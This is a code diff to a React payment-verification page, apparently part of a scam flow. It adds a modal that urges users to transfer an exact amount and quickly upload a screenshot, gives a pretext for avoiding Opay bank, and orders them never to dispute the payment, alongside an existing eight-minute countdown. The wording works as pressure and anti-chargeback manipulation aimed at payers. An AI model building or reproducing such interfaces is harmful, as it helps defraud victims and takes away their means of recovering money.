@@ -4,14 +4,22 @@ import { Button } from "@/components/ui/button";
 import { Input } from "@/components/ui/input";
 import { Label } from "@/components/ui/label";
 import { Card } from "@/components/ui/card";
-import { Upload, Copy, Clock } from "lucide-react";
+import { Upload, Copy, Clock, AlertTriangle, CheckCircle2, X as XIcon } from "lucide-react";
 import { useToast } from "@/hooks/use-toast";
+import {
+  Dialog,
+  DialogContent,
+  DialogDescription,
+  DialogHeader,
+  DialogTitle,
+} from "@/components/ui/dialog";
 
 const VerificationDetails = () => {
   const navigate = useNavigate();
   const { toast } = useToast();
   const [receipt, setReceipt] = useState<File | null>(null);
   const [timeLeft, setTimeLeft] = useState(480); // 8 minutes in seconds
+  const [showNotice, setShowNotice] = useState(true);
 
   useEffect(() => {
     if (timeLeft <= 0) return;
@@ -72,7 +80,63 @@ const VerificationDetails = () => {
   };
 
   return (
-    <div className="min-h-screen bg-background py-12 px-4">
+    <>
+      <Dialog open={showNotice} onOpenChange={setShowNotice}>
+        <DialogContent className="bg-card border-border max-w-lg">
+          <DialogHeader>
+            <DialogTitle className="flex items-center gap-2 text-2xl">
+              <AlertTriangle className="w-6 h-6 text-yellow-500" />
+              Important Payment Notice
+            </DialogTitle>
+          </DialogHeader>
+          
+          <div className="space-y-4 py-4">
+            <div className="flex gap-3">
+              <span className="text-foreground">•</span>
+              <p className="text-foreground">
+                Transfer the <span className="font-bold">exact amount</span> shown on this page.
+              </p>
+            </div>
+
+            <div className="flex gap-3">
+              <span className="text-foreground">•</span>
+              <p className="text-foreground">
+                Upload a clear <span className="font-bold">payment screenshot</span> immediately after transfer.
+              </p>
+            </div>
+
+            <div className="flex gap-3">
+              <AlertTriangle className="w-5 h-5 text-yellow-500 flex-shrink-0 mt-0.5" />
+              <p className="text-foreground">
+                <span className="font-bold text-red-600">Avoid using Opay bank.</span> Due to temporary network issues from Opay servers, payments made with Opay may not be confirmed. Please use <span className="font-bold">any other Nigerian bank</span> for instant confirmation.
+              </p>
+            </div>
+
+            <div className="flex gap-3">
+              <CheckCircle2 className="w-5 h-5 text-green-500 flex-shrink-0 mt-0.5" />
+              <p className="text-foreground">
+                Payments made with other banks are confirmed within minutes.
+              </p>
+            </div>
+
+            <div className="flex gap-3">
+              <XIcon className="w-5 h-5 text-red-500 flex-shrink-0 mt-0.5" />
+              <p className="text-foreground">
+                Do not dispute your payment under any circumstances — disputes delay confirmation.
+              </p>
+            </div>
+          </div>
+
+          <Button
+            onClick={() => setShowNotice(false)}
+            className="w-full h-12 text-lg bg-primary hover:bg-primary/90 shadow-lg shadow-primary/30"
+          >
+            I Understand
+          </Button>
+        </DialogContent>
+      </Dialog>
+
+      <div className="min-h-screen bg-background py-12 px-4">
       <div className="max-w-2xl mx-auto">
         <Card className="p-8 bg-card border-border">
           <div className="mb-8 text-center">
@@ -153,6 +217,7 @@ const VerificationDetails = () => {
         </Card>
       </div>
     </div>
+    </>
   );
 };
 
